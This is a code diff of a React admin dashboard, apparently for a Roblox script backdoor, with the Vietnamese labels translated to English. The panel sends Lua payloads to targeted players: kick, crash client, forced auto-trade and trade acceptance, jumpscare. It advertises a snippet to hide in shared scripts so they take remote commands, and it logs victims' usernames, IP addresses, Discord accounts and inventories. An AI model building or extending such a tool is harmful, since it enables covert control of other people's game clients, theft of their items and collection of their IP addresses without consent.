                   className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white focus:border-yellow-500 outline-none cursor-pointer"
                 >
-                  <option value="ALL">everyone</option>
-                  <option value="USER">username</option>
+                  <option value="ALL">ALL</option>
+                  <option value="USER">User</option>
                   <option value="IP">IP</option>
                 </select>
               </div>
 
               {backdoorTargetType !== 'ALL' && (
                 <div>
-                  <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">({backdoorTargetType}):</label>
+                  <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">VALUE ({backdoorTargetType}):</label>
                   <input
                     type="text"
-                    placeholder={backdoorTargetType === 'USER' ? 'user' : 'ip'}
+                    placeholder={backdoorTargetType === 'USER' ? 'username' : 'ip address'}
                     value={backdoorTargetValue}
                     onChange={(e) => setBackdoorTargetValue(e.target.value)}
                     className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-yellow-400 font-mono focus:border-yellow-500 outline-none"
@@ -959,37 +938,32 @@ sound:Play()`);
               )}
             </div>
 
-            {/* Quick Presets */}
             <div>
-              <label className="text-[10px] font-extrabold text-gray-400 mb-1.5 block">command:</label>
+              <label className="text-[10px] font-extrabold text-gray-400 mb-1.5 block">PRESETS:</label>
               <div className="flex flex-wrap gap-2">
-                <button onClick={() => setPresetPayload('kick')} className="bg-red-500/15 border border-red-500/30 text-red-400 hover:bg-red-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-                  <Skull className="w-3.5 h-3.5" /> Kick Player
+                <button onClick={() => setPresetPayload('kick')} className="bg-red-500/15 border border-red-500/30 text-red-400 hover:bg-red-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Kick Player
                 </button>
-                <button onClick={() => setPresetPayload('crash')} className="bg-purple-500/15 border border-purple-500/30 text-purple-300 hover:bg-purple-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-                  <Zap className="w-3.5 h-3.5" /> Crash Client
+                <button onClick={() => setPresetPayload('crash')} className="bg-purple-500/15 border border-purple-500/30 text-purple-300 hover:bg-purple-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Crash Client
                 </button>
-                <button onClick={() => setPresetPayload('notification')} className="bg-blue-500/15 border border-blue-500/30 text-blue-300 hover:bg-blue-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-                  <MessageSquare className="w-3.5 h-3.5" /> Popup Notification
+                <button onClick={() => setPresetPayload('notification')} className="bg-blue-500/15 border border-blue-500/30 text-blue-300 hover:bg-blue-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Notification
                 </button>
-                
-                <button onClick={() => setPresetPayload('trade')} className="bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-                  <Package className="w-3.5 h-3.5" /> Auto Trade
+                <button onClick={() => setPresetPayload('trade')} className="bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Auto Trade
                 </button>
-                
-                <button onClick={() => setPresetPayload('Agree')} className="bg-green-500/15 border border-green-500/30 text-green-400 hover:bg-green-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-                  <Check className="w-3.5 h-3.5" /> Accept Trade
+                <button onClick={() => setPresetPayload('Agree')} className="bg-green-500/15 border border-green-500/30 text-green-400 hover:bg-green-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Accept Trade
                 </button>
-                
-                <button onClick={() => setPresetPayload('jumpscare')} className="bg-yellow-500/15 border border-yellow-500/30 text-yellow-300 hover:bg-yellow-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-                  <AlertTriangle className="w-3.5 h-3.5" /> Sound Jumpscare
+                <button onClick={() => setPresetPayload('jumpscare')} className="bg-yellow-500/15 border border-yellow-500/30 text-yellow-300 hover:bg-yellow-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Jumpscare
                 </button>
               </div>
             </div>
 
-            {/* Lua Payload Editor */}
             <div>
-              <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">code:</label>
+              <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">LUA PAYLOAD:</label>
               <div className="h-[240px] border border-gray-800 rounded-2xl overflow-hidden shadow-inner bg-[#1e1e1e]">
                 <Editor
                   height="100%"
@@ -1007,41 +981,37 @@ sound:Play()`);
               disabled={isSendingBackdoor}
               className="w-full bg-gradient-to-r from-yellow-500 to-amber-600 text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_25px_rgba(245,158,11,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 active:scale-95 disabled:opacity-50"
             >
-              {isSendingBackdoor ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
-              {isSendingBackdoor ? 'done' : 'execute'}
+              {isSendingBackdoor ? 'Sending...' : 'Execute'}
             </button>
           </div>
 
-          {/* Right Info & Integration Snippet */}
           <div className="lg:col-span-5 flex flex-col gap-4">
-            
             <div className="bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl space-y-3">
               <div className="flex items-center justify-between text-xs font-black text-[#6E96FF]">
-                <span className="flex items-center gap-1.5"><Code2 className="w-4 h-4" /> Snippet Tích Hợp Backdoor Engine</span>
+                <span>Backdoor Integration Snippet</span>
                 <button onClick={handleCopyBackdoorSnippet} className="bg-[#6E96FF] text-black px-2.5 py-1 rounded-lg text-[10px] font-extrabold cursor-pointer">
-                  {copiedBackdoorSnippet ? 'Đã Copy' : 'Copy Code'}
+                  {copiedBackdoorSnippet ? 'Copied' : 'Copy Code'}
                 </button>
               </div>
-              <p className="text-[11px] text-gray-400">Chèn đoạn code Lua này vào bên trong bất kỳ Raw Script nào của bạn để nhận lệnh Backdoor ngầm:</p>
+              <p className="text-[11px] text-gray-400">Include this snippet in raw scripts to listen for remote payload commands:</p>
               <pre className="bg-black/80 p-3 rounded-xl font-mono text-[10px] text-yellow-300/90 border border-gray-800 max-h-[160px] overflow-y-auto">
                 {getBackdoorLuaSnippet()}
               </pre>
             </div>
 
-            {/* History Commands Sent */}
             <div className="bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl space-y-3 flex-1">
-              <h3 className="text-xs font-black text-white uppercase tracking-wider flex items-center gap-1.5">
-                <Activity className="w-4 h-4 text-yellow-400" /> Lịch Sử Lệnh Remote Đã Phát ({backdoorHistory.length})
+              <h3 className="text-xs font-black text-white uppercase tracking-wider">
+                Command History ({backdoorHistory.length})
               </h3>
               <div className="space-y-2 max-h-[260px] overflow-y-auto pr-1">
                 {backdoorHistory.length === 0 ? (
-                  <div className="text-xs text-gray-500 text-center py-6">Chưa có lệnh nào được phát.</div>
+                  <div className="text-xs text-gray-500 text-center py-6">No history available.</div>
                 ) : (
                   backdoorHistory.map((h) => (
                     <div key={h.id} className="bg-black/60 border border-gray-800 p-2.5 rounded-xl font-mono text-[10px] space-y-1">
                       <div className="flex justify-between text-gray-400">
                         <span className="text-yellow-400 font-bold">Target: {h.target_type} ({h.target_value})</span>
-                        <span>{new Date(h.created_at).toLocaleTimeString('vi-VN')}</span>
+                        <span>{new Date(h.created_at).toLocaleTimeString('en-US')}</span>
                       </div>
                       <div className="text-gray-300 truncate font-sans">{h.payload_lua}</div>
                     </div>
@@ -1049,47 +1019,43 @@ sound:Play()`);
                 )}
               </div>
             </div>
-
           </div>
-
         </div>
       )}
 
-      {/* ==================== TAB 4: USER LOGS ==================== */}
+      {/* TAB 4: USER LOGS */}
       {activeTab === 'user_logs' && (
         <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-5 shadow-xl">
           <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
             <div>
               <h2 className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase tracking-wide">
-                <Users className="w-4 h-4" /> Lịch Sử Log Người Dùng & IP ({filteredLogs.length}/{logs.length})
+                Execution Logs ({filteredLogs.length}/{logs.length})
               </h2>
             </div>
             <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
               <button onClick={loadLogsData} className="bg-gray-800 text-gray-200 border border-gray-700 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer hover:bg-gray-700 transition-all">
-                <RefreshCw className={`w-3.5 h-3.5 ${isLoadingLogs ? 'animate-spin' : ''}`} /> Làm Mới
+                {isLoadingLogs ? 'Refreshing...' : 'Refresh'}
               </button>
               <button onClick={handleClearLogs} className="bg-red-500/15 text-red-400 border border-red-500/30 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer hover:bg-red-500/25 transition-all">
-                <Trash2 className="w-3.5 h-3.5" /> Xóa Logs
+                Clear Logs
               </button>
             </div>
           </div>
 
-          {/* Thanh Tìm Kiếm Log Cấu Hình Mới */}
           <div className="relative">
-            <Search className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" />
             <input
               type="text"
-              placeholder="Tìm kiếm theo Roblox Username, Roblox ID, IP Address, Discord User..."
+              placeholder="Search by username, ID, IP, Discord..."
               value={logSearchQuery}
               onChange={(e) => setLogSearchQuery(e.target.value)}
-              className="w-full bg-black/80 border border-gray-800 rounded-xl pl-10 pr-10 py-2.5 text-xs text-white placeholder:text-gray-500 focus:border-[#6E96FF] outline-none transition-all shadow-inner"
+              className="w-full bg-black/80 border border-gray-800 rounded-xl px-4 py-2.5 text-xs text-white placeholder:text-gray-500 focus:border-[#6E96FF] outline-none transition-all shadow-inner"
             />
             {logSearchQuery && (
               <button 
                 onClick={() => setLogSearchQuery('')}
                 className="absolute right-3.5 top-1/2 -translate-y-1/2 text-xs text-gray-400 hover:text-white cursor-pointer bg-gray-800 px-1.5 py-0.5 rounded-md"
               >
-                ✕
+                Clear
               </button>
             )}
           </div>
@@ -1098,19 +1064,19 @@ sound:Play()`);
             <table className="w-full text-left text-xs">
               <thead className="bg-[#0c0f17] text-gray-400 font-extrabold border-b border-gray-800 uppercase text-[10px]">
                 <tr>
-                  <th className="p-3.5">Tài Khoản Roblox</th>
-                  <th className="p-3.5">Loại Server</th>
+                  <th className="p-3.5">Roblox User</th>
+                  <th className="p-3.5">Server Type</th>
                   <th className="p-3.5">IP Address</th>
                   <th className="p-3.5">Discord / Executor</th>
-                  <th className="p-3.5">Thời Gian Exec</th>
-                  <th className="p-3.5">Hành Động</th>
+                  <th className="p-3.5">Timestamp</th>
+                  <th className="p-3.5">Actions</th>
                 </tr>
               </thead>
               <tbody className="divide-y divide-gray-800/60 font-mono">
                 {filteredLogs.length === 0 ? (
                   <tr>
                     <td colSpan={6} className="text-center py-8 text-gray-500 font-sans text-xs">
-                      {logSearchQuery ? `Không tìm thấy Log nào khớp với từ khóa "${logSearchQuery}"` : 'Chưa có dữ liệu log nào.'}
+                      {logSearchQuery ? `No logs match "${logSearchQuery}"` : 'No log data.'}
                     </td>
                   </tr>
                 ) : (
@@ -1124,15 +1090,14 @@ sound:Play()`);
                           <div className="text-[10px] text-gray-400 font-mono">ID: {log.roblox_id}</div>
                         </td>
 
-                        {/* Tag Phân Biệt Server VIP hay Server Thường */}
                         <td className="p-3.5">
                           {log.is_vip ? (
                             <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-black bg-purple-500/15 border border-purple-500/30 text-purple-400">
-                              <Lock className="w-3 h-3" /> Server VIP
+                              VIP Server
                             </span>
                           ) : (
                             <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-black bg-emerald-500/15 border border-emerald-500/30 text-emerald-400">
-                              <Globe className="w-3 h-3" /> Server Thường
+                              Public Server
                             </span>
                           )}
                         </td>
@@ -1140,49 +1105,43 @@ sound:Play()`);
                         <td className="p-3.5 text-[#6E96FF]">{log.ip_address}</td>
                         
                         <td className="p-3.5 font-sans text-xs">
-                          <div className="text-indigo-300 font-bold">{log.discord_user || 'Chưa liên kết'}</div>
+                          <div className="text-indigo-300 font-bold">{log.discord_user || 'N/A'}</div>
                           <div className="text-gray-400 text-[10px] font-mono mt-0.5">{log.executor}</div>
                         </td>
 
                         <td className="p-3.5 text-gray-400 text-[11px]">
-                          {new Date(log.created_at).toLocaleString('vi-VN')}
+                          {new Date(log.created_at).toLocaleString('en-US')}
                         </td>
 
-                        {/* Các nút Hành Động */}
                         <td className="p-3.5">
                           <div className="flex items-center gap-2 flex-wrap">
-                            
-                            {/* Nút Xem Kho Stand & Kho Đồ */}
                             <button
                               onClick={() => handleOpenStorageModal(log)}
-                              className="bg-[#6E96FF]/20 border border-[#6E96FF]/40 text-[#6E96FF] hover:bg-[#6E96FF] hover:text-black px-2.5 py-1 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer transition-all"
+                              className="bg-[#6E96FF]/20 border border-[#6E96FF]/40 text-[#6E96FF] hover:bg-[#6E96FF] hover:text-black px-2.5 py-1 rounded-lg text-[10px] font-bold cursor-pointer transition-all"
                             >
-                              <Package className="w-3 h-3" /> Xem Kho
+                              Storage
                             </button>
 
-                            {/* Nút Copy Join Server */}
                             {log.place_id && log.job_id ? (
                               <button
                                 onClick={() => handleCopyJoinScript(log)}
-                                className={`px-2.5 py-1 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer transition-all ${
+                                className={`px-2.5 py-1 rounded-lg text-[10px] font-bold cursor-pointer transition-all ${
                                   isCopied
                                     ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                                     : 'bg-[#6E96FF]/20 text-[#6E96FF] border border-[#6E96FF]/40 hover:bg-[#6E96FF] hover:text-black'
                                 }`}
                               >
-                                {isCopied ? <Check className="w-3 h-3" /> : <Server className="w-3 h-3" />}
-                                {isCopied ? 'Đã Copy' : 'Copy Join'}
+                                {isCopied ? 'Copied' : 'Copy Join'}
                               </button>
                             ) : (
                               <span className="text-[10px] text-gray-500 italic font-mono">No JobId</span>
                             )}
 
-                            {/* Nút Target Backdoor */}
                             <button
                               onClick={() => handleSelectUserForBackdoor(log.roblox_username)}
-                              className="bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 px-2.5 py-1 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer transition-all"
+                              className="bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 px-2.5 py-1 rounded-lg text-[10px] font-bold cursor-pointer transition-all"
                             >
-                              <Zap className="w-3 h-3" /> Target Backdoor
+                              Target
                             </button>
                           </div>
                         </td>
@@ -1196,15 +1155,15 @@ sound:Play()`);
         </div>
       )}
 
-      {/* ==================== TAB 5: SETTINGS ==================== */}
+      {/* TAB 5: SETTINGS */}
       {activeTab === 'settings' && (
         <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-4 shadow-xl max-w-xl">
           <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase">
-            <Settings className="w-4 h-4" /> Đổi Mật Khẩu Admin
+            Change Admin Password
           </div>
           <input
             type="password"
-            placeholder="Nhập mật khẩu mới..."
+            placeholder="New password..."
             value={newAdminPass}
             onChange={(e) => setNewAdminPass(e.target.value)}
             className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white outline-none focus:border-[#6E96FF]"
@@ -1214,22 +1173,20 @@ sound:Play()`);
             disabled={isSaving}
             className="w-full bg-green-600 text-white font-black py-3 rounded-xl text-xs cursor-pointer hover:bg-green-500 transition-all flex items-center justify-center gap-2 disabled:opacity-50"
           >
-            {isSaving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Save className="w-4 h-4" />}
-            LƯU MẬT KHẨU MỚI
+            {isSaving ? 'Updating...' : 'UPDATE PASSWORD'}
           </button>
         </div>
       )}
 
-      {/* ==================== MODAL XEM KHO STAND & KHO ĐỒ ==================== */}
+      {/* MODAL: STORAGE LOGS */}
       {isStorageModalOpen && selectedStorageLog && (
-        <div className="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-in fade-in duration-200">
+        <div className="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
           <div className="bg-[#0c0f17] border border-[#6E96FF]/40 w-full max-w-2xl rounded-3xl overflow-hidden shadow-[0_0_50px_rgba(110,150,255,0.25)] flex flex-col max-h-[85vh]">
             
-            {/* Modal Header */}
             <div className="p-5 border-b border-white/10 flex items-center justify-between bg-[#080a0f]">
               <div className="flex items-center gap-3">
-                <div className="w-10 h-10 rounded-2xl bg-[#6E96FF]/15 border border-[#6E96FF]/30 flex items-center justify-center text-[#6E96FF]">
-                  <Sparkles className="w-5 h-5" />
+                <div className="w-10 h-10 rounded-2xl bg-[#6E96FF]/15 border border-[#6E96FF]/30 flex items-center justify-center text-[#6E96FF] font-black">
+                  S
                 </div>
                 <div>
                   <h3 className="font-extrabold text-base sm:text-lg text-white flex items-center gap-2">
@@ -1238,18 +1195,17 @@ sound:Play()`);
                       ID: {selectedStorageLog.roblox_id}
                     </span>
                   </h3>
-                  <p className="text-[11px] text-[#949db1]">Xem dữ liệu Kho Stand & Kho đồ được log từ Roblox</p>
+                  <p className="text-[11px] text-[#949db1]">Roblox Storage & Inventory Logs</p>
                 </div>
               </div>
               <button 
                 onClick={() => setIsStorageModalOpen(false)}
-                className="p-2 rounded-xl text-gray-400 hover:text-white hover:bg-white/10 transition-all cursor-pointer"
+                className="p-2 rounded-xl text-gray-400 hover:text-white hover:bg-white/10 transition-all cursor-pointer font-bold"
               >
-                <X className="w-5 h-5" />
+                ✕
               </button>
             </div>
 
-            {/* Modal Navigation Tabs */}
             <div className="p-3 bg-[#080a0f]/60 border-b border-white/5 grid grid-cols-2 gap-2">
               <button
                 onClick={() => setStorageTab('stands')}
@@ -1259,7 +1215,7 @@ sound:Play()`);
                     : 'bg-[#0a0d14] text-gray-400 hover:text-white border border-white/5'
                 }`}
               >
-                <Shield className="w-4 h-4" /> Kho Stand (Storage)
+                Stand Storage
               </button>
 
               <button
@@ -1270,11 +1226,10 @@ sound:Play()`);
                     : 'bg-[#0a0d14] text-gray-400 hover:text-white border border-white/5'
                 }`}
               >
-                <Package className="w-4 h-4" /> Kho Đồ (Inventory)
+                Inventory
               </button>
             </div>
 
-            {/* Modal Body: KHO STAND */}
             {storageTab === 'stands' && (
               <div className="p-5 overflow-y-auto space-y-4">
                 {parsedStandData.slots && parsedStandData.slots.length > 0 ? (
@@ -1304,25 +1259,22 @@ sound:Play()`);
                         </div>
 
                         <div className="mt-2 flex items-center gap-1.5 text-xs text-[#949db1]">
-                          <Layers className="w-3.5 h-3.5 text-[#6E96FF]" />
-                          <span>Thuộc tính: <strong className="text-gray-200">{slot.attribute}</strong></span>
+                          <span>Attribute: <strong className="text-gray-200">{slot.attribute}</strong></span>
                         </div>
                       </div>
                     ))}
                   </div>
                 ) : (
                   <div className="text-center py-10 text-gray-500 font-bold text-xs">
-                    Chưa có dữ liệu kho Stand cho lượt log này.
+                    No stand data logged.
                   </div>
                 )}
 
-                {/* Spec Storage */}
                 <div className="bg-[#080a0f] border border-[#6E96FF]/25 rounded-2xl p-4 flex items-center justify-between">
                   <div className="flex items-center gap-3">
-                    <Box className="w-5 h-5 text-[#6E96FF]" />
                     <div>
                       <div className="text-[10px] font-bold text-[#949db1] uppercase">Spec Storage</div>
-                      <div className="text-sm font-extrabold text-white">{parsedStandData.spec_storage || 'Trống'}</div>
+                      <div className="text-sm font-extrabold text-white">{parsedStandData.spec_storage || 'Empty'}</div>
                     </div>
                   </div>
                   <span className="text-xs bg-[#6E96FF]/10 text-[#6E96FF] border border-[#6E96FF]/30 px-2.5 py-1 rounded-lg font-mono">
@@ -1332,12 +1284,11 @@ sound:Play()`);
               </div>
             )}
 
-            {/* Modal Body: KHO ĐỒ */}
             {storageTab === 'inventory' && (
               <div className="p-5 overflow-y-auto">
                 {parsedInventoryData.length === 0 ? (
                   <div className="text-center py-12 text-gray-500 font-bold text-xs">
-                    Chưa có dữ liệu vật phẩm trong kho đồ cho lượt log này!
+                    No inventory data logged.
                   </div>
                 ) : (
                   <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
@@ -1347,9 +1298,6 @@ sound:Play()`);
                         className="bg-[#080a0f] border border-white/10 rounded-2xl p-3.5 flex items-center justify-between hover:border-[#6E96FF]/50 transition-all"
                       >
                         <div className="flex items-center gap-3 min-w-0">
-                          <div className="w-9 h-9 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-[#6E96FF] shrink-0">
-                            <Package className="w-4 h-4" />
-                          </div>
                           <div className="min-w-0">
                             <div className="font-bold text-xs sm:text-sm text-white truncate">{item.name}</div>
                             <div className="text-[10px] text-[#949db1] font-medium">{item.type}</div>
@@ -1365,13 +1313,12 @@ sound:Play()`);
               </div>
             )}
 
-            {/* Modal Footer */}
             <div className="p-4 bg-[#080a0f] border-t border-white/10 flex justify-end">
               <button
                 onClick={() => setIsStorageModalOpen(false)}
                 className="bg-white/10 hover:bg-white/20 text-white text-xs font-bold py-2 px-5 rounded-xl transition-all cursor-pointer"
               >
-                Đóng
+                Close
               </button>
             </div>
 
